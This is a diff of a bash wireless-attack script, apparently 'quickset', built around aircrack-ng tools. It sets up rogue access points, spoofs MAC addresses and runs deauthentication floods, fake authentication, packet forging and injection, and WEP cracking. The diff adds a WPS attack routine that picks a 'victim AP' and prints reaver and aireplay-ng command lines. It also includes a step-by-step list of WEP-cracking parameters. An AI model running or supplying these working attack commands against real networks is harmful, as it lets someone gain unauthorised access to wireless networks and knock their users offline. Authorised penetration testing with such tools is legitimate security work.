 		if [[ $ip_mac == "fail" ]];then
-			sasm= ## Nulled
+			sasm=
 		fi
 
 		dhcp_func--;;
@@ -1607,7 +1734,7 @@ M)ain Menu$HDR
 		read sas
 		ip_mac-- ip $sas
 		if [[ $ip_mac == "fail" ]];then
-			sas= ## Nulled
+			sas=
 		fi
 
 		dhcp_func--;;
@@ -1619,14 +1746,23 @@ M)ain Menu$HDR
 		6) echo -e "$INP\nCreate Custom DNS Entries? (y or n)"
 		read dns_cus
 		case $dns_cus in
-			y|Y) echo -e "$INS\nEnter the desired IP Addressess of the DNS seperated by a space
-i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
-			read dns_entry
-			dns_cus="Yes" ;;
+			y|Y) dns_cus="Yes" 
+ 			unset dns_cus_array
+			declare -a dns_cus_array
+			echo -e "$INS\nEnter the desired IP Addressess of the DNS.  End with # on a new line.\n"
+			while :;do
+				read dns_entry
+				if [[ $dns_entry != \# ]];then
+					dns_cus_array=("${dns_cus_array[@]}" $dns_entry)
+				else
+					break
+				fi
+
+			done;;
 
 			n|N) dns_cus="No" ;;
 
-			*) dns_cus= ;; ## Nulled
+			*) dns_cus= ;;
 		esac
 
 		dhcp_func--;;
@@ -1636,7 +1772,7 @@ i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
 		case $dhcp_tail in
 			y|Y) dhcp_tail="Yes" ;;
 			n|N) dhcp_tail="No" ;;
-			*) dhcp_tail= ;; ## Nulled
+			*) dhcp_tail= ;;
 		esac
 
 		dhcp_func--;;
@@ -1656,8 +1792,8 @@ i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
 
 	## Clear any dhcp leases that might have been left behind
 	echo > /var/lib/dhcp3/dhcpd.leases
-	## Empty the file to start clean
-	cat /dev/null > /tmp/dhcpd.conf
+	## Remove the file to start clean
+	shred -u /tmp/dhcpd.conf > /dev/null 2>&1
 	## start dhcpd daemon with special configuration file
 	echo -e "$OUT\nGenerating /tmp/dhcpd.conf"
 	echo "default-lease-time 3600;">> /tmp/dhcpd.conf
@@ -1668,52 +1804,75 @@ i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
 	echo "subnet $sas netmask $sasm {" >> /tmp/dhcpd.conf
 	echo "range $sair;" >> /tmp/dhcpd.conf
 	echo "option routers $sapip;" >> /tmp/dhcpd.conf
-## Old messy way of doing things
-# 	for sadns in $(cat /etc/resolv.conf | sed -r 's/^.* ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/' | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}');do
-## Cleaner way of doing things
+	## Old messy way of doing things
+	# 	for dns_entry in $(cat /etc/resolv.conf | sed -r 's/^.* ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/' | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}');do
+	## Cleaner way of doing things
 	if [[ $dns_cus == "No" ]];then
-		for sadns in $(grep nameserver /etc/resolv.conf | awk '{print $2}');do
-			echo "option domain-name-servers $sadns;" >> /tmp/dhcpd.conf
+		for dns_entry in $(grep nameserver /etc/resolv.conf | awk '{print $2}');do
+			echo "option domain-name-servers $dns_entry;" >> /tmp/dhcpd.conf
 		done
 	else
-		custom_dns-- $dns_entry
+		dns_total=$(echo ${#dns_cus_array[@]})
+		for (( i = 0 ; i < $dns_total ; i++ ));do
+			echo "option domain-name-servers "${dns_cus_array[$i]}";" >> /tmp/dhcpd.conf
+		done
 	fi
 
 	echo "}"  >> /tmp/dhcpd.conf
+	dhcp_tmp=1 ## Variable for determining if /tmp/dhcpd.conf has been created
 	}
 
 	dhcp_svr_II--()
 	{
-	echo -e "$OUT"
-	##Gives dhcpd the permissions it needs
-	mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd
-	dhcpd3 -cf $dhcpdconf -pf /var/run/dhcpd/dhcpd.pid $dhcp_dev &
-	dhcp_svr_stat="active"
-	if [ $? -ne 0 ];then
-		echo -e "$WRN\nThe DHCP server could not be started\nPress Enter to Return to Routing Features"
-		read
-		routing--
-	else
+
+		dhcp_svr_III--()
+		{
+		dhcp_svr_stat="active"
 		route add -net $sas netmask $sasm gw $sapip
 		iptables -P FORWARD ACCEPT
 		case $rte_choice in
 			3|5) iptables -t nat -A POSTROUTING -o $ie -j MASQUERADE;;
 		esac
 
+		echo -e "$OUT\n\n\n\nDHCP server started succesfully\n\n"
+		sleep 1
 		case $dhcp_tail in
 			Yes) Eterm -b black -f white --pause --title "DHCP Server Tail /var/lib/dhcp3/dhcpd.leases" -e tail -f /var/lib/dhcp3/dhcpd.leases & ;;
 		esac
-
-		echo -e "$OUT\n\n\n\nDHCP server started succesfully\n\n"
-		sleep 3
 		echo -e "$INS\n\n\n\nPress Enter to Return to Routing Features"
+		read
+		routing--
+		}
+
+	##Gives dhcpd the permissions it needs
+	mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd
+	shred -u /var/run/dhcpd/dhcpd.pid > /dev/null 2>&1
+	clear
+	echo -e "$OUT"
+	dhcpd3 -cf $dhcpdconf -pf /var/run/dhcpd/dhcpd.pid $dhcp_dev &
+	for (( counter=0 ; counter < 7; counter++ ));do ## counter= Simple counting variable, nothing else..
+		ps aux | grep -v grep | grep '/var/run/dhcpd/dhcpd.pid' > /dev/null 2>&1
+		if [[ $? -ne 0 ]];then
+			sleep 1
+        else
+			dhcpd_success="yes" ## pid_success= Variable for testing if dhcpd.pid was created
+			counter="8"
+			break
+		fi
+
+	done
+
+	if [[ $dhcpd_success == "yes" ]];then
+		dhcp_svr_III--
+	else
+		echo -e "$WRN\nThe DHCP server could not be started\nPress Enter to Return to Routing Features"
 		read
 		routing--
 	fi
 	}
 
-if [ -e $dhcpdconf ] ; then
-	while [ -z $var ];do
+if [[ -e $dhcpdconf ]] ; then
+	while [[ -z $var ]];do
 		echo -e "$WRN\nDHCP Server Configuration File Exists$INP\n
 Create New File [\033[31mDeleting /tmp/dhcpd.conf$INP] (y or n)?"
 		read var
@@ -1724,7 +1883,7 @@ Create New File [\033[31mDeleting /tmp/dhcpd.conf$INP] (y or n)?"
 			n|N) echo > /var/lib/dhcp3/dhcpd.leases ## Clear any dhcp leases that might have been left behind
 			dhcp_svr_II--;;
 
-			*) var= ;; ## Nulled
+			*) var= ;;
 		esac
 
 	done
@@ -1753,8 +1912,8 @@ ap_setup--()
 	var_meth--()
 	{
 	clear
-	bb= ## Nulled
-	while [ -z $bb ];do
+	bb=
+	while [[ -z $bb ]];do
 		echo -e "$HDR
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                --Method Selection--
@@ -1799,7 +1958,7 @@ case $var in
 	read sapip
 	ip_mac-- ip $sapip
 		if [[ $ip_mac == "fail" ]];then
-			sapip= ## Nulled
+			sapip=
 		fi
 
 	ap_setup--;;
@@ -1808,7 +1967,7 @@ case $var in
 	read sasm
 	ip_mac-- ip $sasm
 		if [[ $ip_mac == "fail" ]];then
-			sasm= ## Nulled
+			sasm=
 		fi
 
 	ap_setup--;;
@@ -1817,7 +1976,7 @@ case $var in
 	read sac
 	case $sac in
 		1|2|3|4|5|6|7|8|9|10|11|12|13|14) ;;
-		*) sac= ;; ## Nulled
+		*) sac= ;;
 	esac
 
 	ap_setup--;;
@@ -1825,7 +1984,7 @@ case $var in
 	4) echo -e "$INP\nDesired MTU Size? (42-6122)"
 	read mtu_size
 	if [[ $mtu_size -lt 42 || $mtu_size -gt 6122 ]];then
-		mtu_size= ## Nulled
+		mtu_size=
 	fi
 
 	ap_setup--;;
@@ -1835,7 +1994,7 @@ case $var in
 	case $dhcp_autol in
 		y|Y) dhcp_autol="Yes" ;;
 		n|N) dhcp_autol="No" ;;
-		*) dhcp_autol= ;; ## Nulled
+		*) dhcp_autol= ;;
 	esac
 
 	ap_setup--;;
@@ -1868,29 +2027,29 @@ pres_mac=$(ifconfig $pii | awk '{print $5}' | awk '{print $1}' | cut -c1-17 | tr
 pres_mac=$(echo $pres_mac | awk '{print $1}')
 #blackhole targets every single probe request on current channel
 modprobe tun
-if [ $bb == "1" ]; then
+if [[ $bb == "1" ]]; then
 	Eterm -b black -f white --pause --title "Blackhole AP" -e airbase-ng -c $sac -P -C 60 $pii &
 	clear
 ## bullzeye targets specified ESSID only
-elif [ $bb == "2" ]; then
-	ssid= ## Nulled
-	while [ -z $ssid ];do
+elif [[ $bb == "2" ]]; then
+	ssid=
+	while [[ -z $ssid ]];do
 		echo -e "$INP\nDesired ESSID?"
 		read ssid
 	done
 
 	Eterm -b black -f white --pause --title "Bullzeye AP" -e airbase-ng -c $sac -e "$ssid" $pii &
 	clear
-elif [ $bb == "3" ];then
-	private= ## Nulled
-	ssid= ## Nulled
-	while  [ -z $ssid ];do
+elif [[ $bb == "3" ]];then
+	private=
+	ssid=
+	while  [[ -z $ssid ]];do
 		echo -e "$INP\nDesired ESSID?"
 		read ssid
 	done
 
-	var= ## Nulled
-	while [ -z $var ];do
+	var=
+	while [[ -z $var ]];do
 		echo -e "$INP\nUse WEP? (y or n)"
 		read var
 	done
@@ -1907,14 +2066,25 @@ elif [ $bb == "3" ];then
 	esac
 fi
 
-# give enough time before next command for interface to come up
-# Intended to prevent errors on Virtual Machines with USB cards
-echo -e "$OUT\nConfiguring Devices.............."
-sleep 7
+echo -e "$OUT\nConfiguring Devices..............\n"
+## We want to give enough time before trying to down the virtual NIC for MAC changing and continuance of the script
+## Need to slow quickset down for a little bit of time, or at least until at0 is created
+for (( counter=0 ; counter < 13; counter++ ));do ## counter= Simple counting variable, nothing else..
+	ifconfig at0 > /dev/null 2>&1
+	if [[ $? -ne 0 ]];then
+		sleep .5
+	else
+		counter="14"
+		break
+	fi
+
+done
+
+ifconfig at0 down
 macchanger -m $pres_mac at0
+sleep 1.5
 ifconfig at0 up $sapip netmask $sasm
 ifconfig at0 mtu $mtu_size
-
 if [[ $dhcp_autol == "Yes" ]];then
 	dhcp_pre_var--
 	dhcp_svr--
@@ -2001,43 +2171,10 @@ wifi_101--()
 trap trap-- INT
 
 ##~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- Repitious Functions ~~~~~~~~~~~~~~~~~~~~~##
-	tchan--()
-	{
-	tc= ## tgt channel
-	while [ -z $tc ];do
-		echo -e "$INP\nTgt Channel? (1-14)"
-		read tc
-### Need to learn to case within range...Also learn if within range (with sanitization) [1-14]???
-		case $tc in
-			1|2|3|4|5|6|7|8|9|10|11|12|13|14) ;;
-			*) tc= ## Nulled
-		esac
-
-	done
-
-	case $parent_IV in
-		dump) dump--;;
-	esac
-
-	case $parent_III in
-		rtech) parent_III= ## Nulled to prevent repeat looping that is NOT wanted!
-		rtech_II--;;
-	esac
-
-	case $parent_VI in
-		ctech) ctech_II--;;
-	esac
-
-	case $parent_VII in
-		WPA) parent_VII= ## Nulled to prevent repeat looping that is NOT wanted!
-		WPA_II--;;
-	esac
-	}
-
 	cfile--()
 	{
 	cf= ## capture file name
-	while [ -z $cf ];do
+	while [[ -z $cf ]];do
 		echo -e "$INP\nCapture File Name?"
 		read cf
 	done
@@ -2050,7 +2187,7 @@ trap trap-- INT
 		crack) crack--;;
 	esac
 
-## Yes, the next couple lines are lazy, I will eventually create cfile_III--(), right now, I am just pushing to get this new version out.
+	## cfile_III--() should replace this eventually
 	case $parent_VI in
 		ctech) parent_VI= ## Nulled to prevent repeat looping that is NOT wanted!
 		Eterm -b black -f white --pause --title "Shared-Key PRGA Capture" -e airbase-ng $pii -c $tc -e "$e" -s -W 1 -F $cf &
@@ -2092,32 +2229,36 @@ YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG ETERM SESSION
 ##~~~~~~~~~~~~~~~~~~~~ BEGIN Starting wifi_101-- Function ~~~~~~~~~~~~~~~~~~~~~##
 	venue--()
 	{
-	parent= ## Nulled
-	parent_VII= ## Nulled
+	parent=
+	parent_VII=
+	chan_res=$(iwlist $pii channel | grep Current | awk '{print $5}' | sed 's/)//')
+	tc=$chan_res
 	clear
 	echo -e "$HDR
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             --WiFi 101 Venue Selection--
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
-1) Scan Channels
+1)  Scan Channels
 
-2) Airodump Capture
+2)  Airodump Capture
 
-3) De-Authentications
+3)  De-Authentications
 
-4) Fake Authentications
+4)  Fake Authentications
 
-5) Router-Based WEP Attacks
+5)  Router-Based WEP Attacks
 
-6) Packet Forging
+6)  Packet Forging
 
-7) Forged Packet Injection
+7)  Forged Packet Injection
 
-8) Client-Based WEP Attacks
+8)  Client-Based WEP Attacks
 
-9) Crack WEP .pcap
+9)  Crack WEP .pcap
 
-0) WPA Attacks
+10) Client-Based WPA Attacks
+
+11) WACg-Style WPS Attack
 
 L)ist the Steps needed to Crack WEP
 
@@ -2125,7 +2266,7 @@ M)ain Menu$HDR
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 	read var
 	case $var in
-		1|2|3|4|5|6|7|8|0) if [ -z $pii ];then
+		1|2|3|4|5|6|7|8|10|11) if [[ -z $pii ]];then
 			dev_parent="venue--"
 			no_dev-- monitor
 		fi;;
@@ -2139,7 +2280,7 @@ M)ain Menu$HDR
 
 		2) b= ## tgt bssid
 		tc= ## Nulled
-		cf= ## Nulled
+		cf=
 		of="pcap" ## Output Format for Airodump-NG
 		parent="venue"
 		dump--;;
@@ -2147,9 +2288,7 @@ M)ain Menu$HDR
 		3) wifi_deauth--;;
 
 		4) 	ska_xor= ## Variable for file used w/ SKA injection
-		hid_essid= ## Variable for hidden ESSID
-# 		sm= ## source mac
-		
+		hid_essid= ## Variable for hidden ESSID		
 		rd=10 ## reauthentication delay
 		ppb=1 ## Re-authentication packets per burst
 		kaf=3 ## keep-alive frequency
@@ -2163,6 +2302,7 @@ M)ain Menu$HDR
 		pforge--;;
 
 		7) parent="venue"
+		rppb=500
 		forge_out--;;
 
 		8) parent="venue"
@@ -2171,8 +2311,10 @@ M)ain Menu$HDR
 		9) parent="venue"
 		crack--;;
 
-		0) parent_VII="WPA"
+		10) parent_VII="WPA"
 		WPA--;;
+
+		11) wacg--;;
 
 		l|L) lists--;;
 
@@ -2231,7 +2373,7 @@ M)ain Menu$HDR
 
 	dump--()
 	{
-	parent_IV= ## Nulled
+	parent_IV=
 	clear
 	echo -e "$HDR
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -2254,8 +2396,7 @@ M)ain Menu$HDR
 	read var
 	case $var in
 		1) parent_IV="dump" 
-		tchan--
-		iwconfig $pii channel $tc;;
+		tchan--;;
 
 		2) echo -e "$INP\nTgt BSSID? (Leave Blank to Null)"
 		read b
@@ -2264,13 +2405,13 @@ M)ain Menu$HDR
 		3) parent_IV="dump" 
 		cfile--;;
 
-		4) of= ## Nulled
-		while [ -z $of ];do
+		4) of=
+		while [[ -z $of ]];do
 			echo -e "$INP\nOutput Format? (pcap, ivs, csv, gps, kismet, netxml)"
 			read of
 			case $of in
 				pcap|ivs|csv|gps|kismet|netxml) ;;
-				*) of= ;; ## Nulled
+				*) of= ;;
 			esac
 
 		done
@@ -2315,14 +2456,14 @@ M)ain Menu$HDR
 			wifi_switch_deauth--()
 			{
 			kill -9 $wifi_dea_pid
-			sc= ## Nulled
-			while [ -z $sc ];do
+			sc=
+			while [[ -z $sc ]];do
 				echo -e "$INP\nSpecified Channel(s)?\n(ie.. 1) (ie.. 1,2,3) (ie.. 1-14)"
 				read sc
 			done
 
-			hop= ## Nulled
-			while [ -z $hop ];do	
+			hop=
+			while [[ -z $hop ]];do	
 				echo -e "$INP\nMilliseconds between channel hops?"
 				read hop
 			done
@@ -2335,7 +2476,7 @@ M)ain Menu$HDR
 			wifi_deauth_III--()
 			{
 			r_d= ## Repeat DeAuth Variable
-			while [ -z $r_d ];do
+			while [[ -z $r_d ]];do
 				clear
 				echo -e "$INP\n(R)epeat DeAuth\n(C)hange or Add Client for DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth" 
 				read r_d
@@ -2363,7 +2504,7 @@ M)ain Menu$HDR
 			esac
 			}
 
-		while [ -z $dt ];do
+		while [[ -z $dt ]];do
 			clear
 			echo -e "$INP\n(B)roadcast Deauth\n(C)lient Targeted DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth"
 			read dt
@@ -2374,7 +2515,7 @@ M)ain Menu$HDR
 			aireplay-ng $pii -0 4 -a $rb
 			wifi_deauth_III--;;
 
-			c|C) while [ -z $cm ];do
+			c|C) while [[ -z $cm ]];do
 				echo -e "$INP\nClient MAC address?"
 				read cm
 			done
@@ -2393,12 +2534,25 @@ M)ain Menu$HDR
 
 	clear
 
-	echo -e "$INP\nSpecified Channel? (1-14)$WRN {choose only one channel}$INP"
-	read sc
-	case $sc in
-		1|2|3|4|5|6|7|8|9|10|11|12|13|14) ;;
-		*) venue--
-	esac
+	chan_check-- $pii
+	if [[ -n $chan_res ]];then
+		echo -e "$OUT\nCurrent Channel is: $chan_res.  Would You Like to Change it? (y/n)"
+		read var
+		case $var in
+			y|Y) tchan--;;
+			n|N) tc=$chan_res ;;
+			*) venue--;;
+		esac
+
+	else
+		tchan--
+	fi
+
+	if [[ -z $tc ]];then
+		venue--
+	fi
+
+	sc=$tc
 
 	echo -e "$INP\nRouter BSSID?"
 	read rb
@@ -2427,11 +2581,11 @@ M)ain Menu$HDR
 
 3) Source MAC                                             [$OUT$sm$INP]
 
-4) Re-Authentication Packets per Burst {1 is Recommended} [$OUT$ppb$INP]
+4) Re-Authentication Packets per Burst                    [$OUT$ppb$INP]
 
-5) Re-Authentication Delay in Seconds {10 is Recommended} [$OUT$rd$INP]
+5) Re-Authentication Delay in Seconds                     [$OUT$rd$INP]
 
-6) Keep-Alive Frequency in Seconds {3 is Recommended}     [$OUT$kaf$INP]
+6) Keep-Alive Frequency in Seconds                        [$OUT$kaf$INP]
 
 7) ESSID {Optional, Must be Used if ESSID is Hidden}      [$OUT$hid_essid$INP]
 
@@ -2445,9 +2599,26 @@ M)ain Menu$HDR
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 	read var
 	case $var in
-		1) tchan--
-		iwconfig $pii channel $tc
-		auth--;;
+		1) chan_check-- $pii
+		if [[ -n $chan_res ]];then
+			echo -e "$OUT\nCurrent Channel is: $chan_res.  Would You Like to Change it? (y/n)"
+			read var
+			case $var in
+				y|Y) tchan--;;
+				n|N) tc=$chan_res ;;
+				*) auth--;;
+			esac
+
+		else
+			tchan--
+		fi
+
+		if [[ -z $tc ]];then
+			auth--
+		else
+			iwconfig $pii channel $tc
+			auth--
+		fi;;
 
 		2) echo -e "$INP\nTgt BSSID?"
 		read b
@@ -2457,13 +2628,13 @@ M)ain Menu$HDR
 		read sm
 		auth--;;
 
-		4) ppb= ## Nulled
-		while [ -z $ppb ];do
+		4) ppb=
+		while [[ -z $ppb ]];do
 			echo -e "$INP\nRe-Authentication Packets per Burst? (1=Single 0=Multiple)"
 			read ppb
 			case $ppb in
 				1|0) ;;
-				*) ppb= ;; ## Nulled
+				*) ppb= ;;
 			esac
 		done
 
@@ -2539,7 +2710,7 @@ M)ain Menu$HDR
 			3|4) parent_II="broadarp";;
 		esac
 
-		e= ## Nulled
+		e=
 		rtech_II--;;
 
 		p|P) venue--;;
@@ -2637,7 +2808,7 @@ P)revious Menu$HDR
 			read src_ip
 			ip_mac-- ip $src_ip
 			if [[ $ip_mac == "fail" ]];then
-				src_ip= ## Nulled
+				src_ip=
 			fi
 
 			pforge_A--;;
@@ -2646,7 +2817,7 @@ P)revious Menu$HDR
 			read dst_ip
 			ip_mac-- ip $dst_ip
 			if [[ $ip_mac == "fail" ]];then
-				dst_ip= ## Nulled
+				dst_ip=
 			fi
 
 			pforge_A--;;
@@ -2696,7 +2867,7 @@ M)ain Menu$HDR
 	esac
 
 	case $p_mode in
-		simple|advanced) while [ -z $pf_var ];do
+		simple|advanced) while [[ -z $pf_var ]];do
 			echo -e "$INP\nWhat was the name of the file just created?"
 			read pf_var
 		done
@@ -2732,9 +2903,9 @@ M)ain Menu$HDR
 	case $var in
 		1) echo -e "$INP\nReplayed Packets per Burst?"
 		read rppb
-		if [ $rppb -gt 1000 ];then
+		if [[ $rppb -gt 1000 ]];then
 			rppb=1000
-		elif [ $rppb -lt 1 ];then
+		elif [[ $rppb -lt 1 ]];then
 			rppb=1
 		fi
 		forge_out--;;
@@ -2884,7 +3055,7 @@ M)ain Menu$HDR
 
 	case $wifu in
 		1|2|3|7|8|9) spec="1"
-		while [ -z $e ];do
+		while [[ -z $e ]];do
 			echo -e "$INP\nDefine ESSID"
 			read e
 		done;;
@@ -2893,32 +3064,192 @@ M)ain Menu$HDR
 		all_probe='-P -C 60';;
 	esac
 
-	tchan--
-	iwconfig $pii channel $tc
+	chan_check-- $pii
+	if [[ -n $chan_res ]];then
+		echo -e "$OUT\nCurrent Channel is: $chan_res.  Would You Like to Change it? (y/n)"
+		read var
+	else
+		tchan--
+	fi
+
+	case $var in
+		y|Y) tchan--;;
+		n|N) tc=$chan_res ;;
+		*) WPA--;;
+	esac
+
+	if [[ -z $tc ]];then
+		WPA--
+	fi
+
+	WPA_II--
+	}
+
+	wacg--()
+	{
+	pidfile="/tmp/WACg/airo.pid"
+	capture="airodump-ng -w /tmp/WACg/capture $pii --output-format csv,netxml"
+	my_mac=$(macchanger -s $pii |cut -d" " -f3)
+
+		countdown--()
+		{
+		IFS=:
+		set -- $*
+		secs=$(( ${1#0} ))
+		while [ $secs -gt 0 ]; do
+			sleep 1 &
+			printf "\r[*] Time remaining - %02d:%02d:%02d" $((secs/3600)) $(( (secs/60)%60)) $((secs%60))
+			secs=$(( $secs - 1 ))
+			wait
+		done
+		}
+
+		wacg_scan--()
+		{
+		shred -u /tmp/WACg/* > /dev/null 2>&1
+		rm -r /tmp/WACg >/dev/null 2>&1
+		mkdir /tmp/WACg > /dev/null 2>&1
+		$capture &>/dev/null &
+		PID=$!
+		echo $PID > "$pidfile" &
+		echo -e "$OUT"
+		countdown-- "$cnt_time" & sleep $cnt_time && echo -e "$OUT\n[>] Done!!\n" &&
+
+		for pidkill in $(cat $pidfile); do
+			(kill -9 $pidkill 2>/dev/null) &    # Dirty but supresses kill output
+			wait $pidkill 2>/dev/null           #
+		done
+
+		## Split up capture and clean up
+		## AP Fields: BSSID,channel,Privacy,Cipher,beacons,IV,ESSID
+		## Client Fields: Station MAC,Power,packets,BSSID,Probed ESSIDs
+		## Add flags to AP's for Clients and WPS
+		cat /tmp/WACg/capture-01.csv | tr -d " " | grep -a WPA | cut -d"," -f 1,4,6-7,10-11,14 | sed 's/$/,/' >> /tmp/WACg/AP-WPA.txt
+		#Associated Client List
+		cat /tmp/WACg/capture-01.kismet.netxml | grep "<client-mac>" | cut -d">" -f2 | cut -d"<" -f1 >> /tmp/WACg/client-tmp.txt
+		for client in $(cat /tmp/WACg/client-tmp.txt); do
+			(cat /tmp/WACg/capture-01.csv |grep -a $client >> /tmp/WACg/clients-tmp.txt) > /dev/null 2>&1
+		done
+
+		(cat /tmp/WACg/clients-tmp.txt |tr -d " " |cut -d"," -f1,4-7 >> /tmp/WACg/clients.txt) > /dev/null 2>&1
+		## Set client flag for AP's (Y/N)
+		for cliY in $(cat /tmp/WACg/clients.txt |cut -d"," -f4 |uniq); do
+			sed -i "/^$cliY/ s/\$/Yes/" /tmp/WACg/AP-WPA.txt
+		done
+
+		for cliN in $(cat /tmp/WACg/AP-*.txt |cut -d"," -f1-8 |egrep -a -v "Yes" |cut -d"," -f1); do
+			sed -i "/^$cliN/ s/\$/No /" /tmp/WACg/AP-WPA.txt
+		done
+
+		## Set WPA WPS flag for reaver (Y/N)
+		wash -f /tmp/WACg/capture-*.cap -C >> /tmp/WACg/wps_tmp.txt 2>/dev/null
+		cat /tmp/WACg/wps_tmp.txt |grep ":" |tr ' ' ',' |sed 's/,,,,,,/,/g' |sed 's/,,,,,,/,/g' |sed 's/,,/,/g' |sed 's/,,/,/g' |sed 's/,,/,/g' >> /tmp/WACg/wps.txt
+		sed -i 's/$/,/' /tmp/WACg/AP-WPA.txt
+		for wpsY in $(cat /tmp/WACg/wps.txt |cut -d"," -f1); do
+			sed -i "/^$wpsY/ s/\$/Yes/" /tmp/WACg/AP-WPA.txt
+		done
+
+		for wpsN in $(cat /tmp/WACg/AP-WPA.txt |cut -d"," -f1-7,9 |egrep -a -v "Yes" |cut -d"," -f1); do
+			sed -i "/^$wpsN/ s/\$/No /" /tmp/WACg/AP-WPA.txt
+		done
+
+		wacg_check="active"
+		## Display Networks
+		echo -e "$OUT\nAvailable WPA-Networks:$INS\n[If ESSID is empty the network is hidden!]\n$OUT"
+		cat /tmp/WACg/AP-WPA.txt |awk -F, '{print "BSSID: " $1 "\tChannel: " $2 "\tClients: " $8  "\tWPS: " $9 "\tESSID: " $7}'
+		wacg_II--
+		}
+
+		wacg_II--()
+		{
+		var_II=
+		while [[ -z $var_II ]];do
+			echo -e "$INP\n\n\n(C)ontinue, (R)escan, or (P)revious Menu?"
+			read var
+			case $var in
+				c|C)var_II=1 ;;
+
+				p|P) venue--;;
+
+				r|R)var_II=1
+				clear
+				wacg_scan--;;
+			esac
+
+		done
+
+		echo -e "$INP\n[>] Select victim AP MAC address"
+		echo -n "MAC: "
+		read -e vic_mac
+		vic_chan=$(grep -a $vic_mac /tmp/WACg/AP-*.txt |cut -d"," -f2)
+		echo -e "$INP\n[>] Use (R)eaver or (A)ireplay-ng to associate with the target"
+		read -e wacg_asc
+		case $wacg_asc in
+			r|R) clear 
+			echo -e "$INS\nreaver -i $pii --delay=0 --dh-small --lock-delay=250 --fail-wait=250 --eap-terminate -v -c $vic_chan -b $vic_mac\n\n\n$HDR"
+			read -p "[>] Return to Main Menu press [Enter]..." readEnterKey 
+			venue--;;
+
+			a|A) clear
+			echo -e "$INS\niwconfig $pii $vic_chan"
+			echo "aireplay-ng -1 4 -o 1 -q 2 -a $vic_mac -h $my_mac $pii"
+			echo "reaver -i $pii --delay=0 --dh-small --lock-delay=250 --fail-wait=250 --eap-terminate -v -A -b $vic_mac"
+			echo -e "\n\n$HDR"
+			read -p "[>] Return to Main Menu press [Enter]..." readEnterKey 
+			venue--;;
+		esac
+		}
+
+	clear
+	var=
+	while [[ -z $var ]];do
+		echo -e "$INP\nAiroDump-NG Scanning Time?"
+		read cnt_time
+		if [[ -z $cnt_time ]];then
+			cnt_time=10
+			var=1
+		fi
+
+		if [ $cnt_time -eq $cnt_time 2> /dev/null ];then
+			var=1
+		fi
+
+	done
+
+	wacg_scan--
+# 	wacg_II--
 	}
 
 	lists--()
 	{
 	clear
 	echo -e "$INS
-1 - Start the wireless interface in monitor mode on the specific AP channel
+SM - Desired Source MAC
+AP - Access Point
 
-2 - Use aireplay-ng to do a fake authentication with the access point
-    If this fails due to use of SKA, do:
-        A) Start the wireless interface in monitor mode on the specific AP channel
-        B) Start airodump-ng on AP channel with filter for bssid to collect the PRGA xor file
-        C) Deauthenticate a connected client
-        D) Perform shared key fake authentication
+Activate capture file on desired channel/bssid
 
-3 - If using standard ARP replays or Broadcast attacks, then:
-        A) Run aircrack-ng to crack key using the IVs collected
+Use aireplay-ng to do a fake authentication with the access point [-1 6000 -q 5 -a "AP" -h "SM"]
 
-    elif using fragmentation attack or chopchop, then:
-        A) Use aireplay-ng chopchop or fragmentation attack to obtain PRGA .xor file
-        B) Use packetforge-ng to create an arp packet using the .xor obtain in the previous step
-        C) Start airodump-ng on AP channel with filter for bssid to collect the new unique IVs
-        D) Inject the arp packet created in step B
-        E) Run aircrack-ng to crack key using the IVs collected"
+Fake SKA Authentication
+	a. Deauthenticate a connected client to grab a xor
+	b. Authenticate via the xor [-1 6000 -q 5 -a "AP" -h "SM" -y "xor"]
+	c. Fragment the xor against the AP to create a new xor [-5 -b "AP" -h "SM"]
+	d. Packetforge the new xor [-0 -a "AP" -h "SM" -k {dest} "255.255.255.255" -l {src} "255.255.255.255" -y "new_xor" -w "arp_request"] 
+	e. Replay the forged arp_request packet against the AP [-2 -b "AP" -h "SM" -y "arp_request"]
+
+If using standard ARP replays or Broadcast attacks, then:
+	a. Run aircrack-ng to crack key using the IVs collected
+
+If using chopchop or a fragmentation attack, then:
+	a. Obtain the PRGA .xor
+	b. Packetforge the .xor [-0 -a "AP" -h "SM" -k {dest} "255.255.255.255" -l {src} "255.255.255.255" -y "new_xor" -w "arp_request"]
+	c. Replay the forged arp_request packet against the AP [-2 -b "AP" -h "SM" -y "arp_request"]
+	d. Run aircrack-ng to crack key using the IVs collected
+
+For ARP amplification run a chopchop attack and decrypt the .cap file it creates:
+	a. tcpdump -s 0 -n -e -r chopchop.cap
+	b. Packetforge the .xor [-0 -a "AP" -h "SM" -k {dest} -l {src} -y "new_xor" -w "arp_request"]"
 	read
 	venue--
 	}
@@ -2950,8 +3281,7 @@ M)ain Menu$HDR
 		read var
 		case $var in
 			1) parent_III="rtech" 
-			tchan--
-			iwconfig $pii channel $tc ;;
+			tchan--;;
 
 			2) echo -e "$INP\nSource MAC?"
 			read sm
@@ -3002,16 +3332,15 @@ M)ain Menu$HDR
 		case $var in
 			1) echo -e "$INP\nReplayed Packets per Burst?"
 			read rppb
